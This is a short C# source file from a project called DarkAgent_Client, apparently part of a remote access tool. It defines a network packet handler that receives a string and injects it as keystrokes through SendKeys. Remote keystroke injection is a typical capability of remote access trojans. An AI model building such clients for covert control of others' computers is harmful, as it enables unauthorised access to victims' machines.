using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;

namespace DarkAgent_Client.src.Network.DataNetwork.Packets.Receive
{
    class R_RemoteKeyboard : ReceiveBasePacket
    {
        public R_RemoteKeyboard(ClientConnect client, byte[] packet)
            : base(client, packet)
        {
        }

        private string key;
        public override void Read()
        {
            key = ReadString();
        }

        public override void Run()
        {
            //if(key.Length >= 2)
            //    key = "{" + key.ToUpper() + "}";

            SendKeys.SendWait(key);
        }
    }
}